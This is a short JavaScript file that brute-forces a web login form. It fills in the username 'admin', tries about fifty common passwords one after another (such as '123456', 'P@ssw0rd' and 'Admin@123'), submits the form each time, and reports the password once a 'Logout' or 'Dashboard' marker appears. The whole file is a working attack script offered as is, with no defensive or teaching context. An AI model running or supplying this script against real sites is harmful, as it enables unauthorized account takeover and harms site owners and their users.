const passwords = [
    "123456", "admin", "root", "qwerty", "admin123", "1234", 
    "welcome", "P@55w0rd", "letmein", "password1", "guest", 
    "user", "1234567", "password123", "test", "111111", "12345", 
    "pass", "abc123", "654321", "12345678", "qwerty123", "123123", "987654", "1111", "abcd1234", 
    "123qwe", "password1", "admin1", "P@ssw0rd", "Aa123456", "root123", 
    "welcome123", "123456789", "user123", "qwertyuiop", "demo", 
    "test123", "1234abcd", "password1", "adminadmin", "123321", 
    "Password", "1q2w3e", "Admin@123", "pass1234", "Abcd@123", 
    "password1234", "adminpassword", "1234567890", "Aa123456@"
];


const username = "admin";


async function tryLogin(password) {
    
    document.getElementById('username').value = username;
    document.getElementById('password').value = password;

    
    console.log(`Trying: ${username} / ${password}`);

    
    document.querySelector('input[type="submit"]').click();

    
    await new Promise(resolve => setTimeout(resolve, 2000)); 
    
    
    if (document.body.innerHTML.includes("Logout") || document.body.innerHTML.includes("Dashboard")) {
        console.log(`Success! Username: ${username}, Password: ${password}`);
        alert(`Login successful! Password is: ${password}`);
        return true; 
    }

    return false; 
}


async function bruteForceLogin() {
    for (let i = 0; i < passwords.length; i++) {
        const success = await tryLogin(passwords[i]);
        if (success) {
            break; 
        }
    }
}

bruteForceLogin();
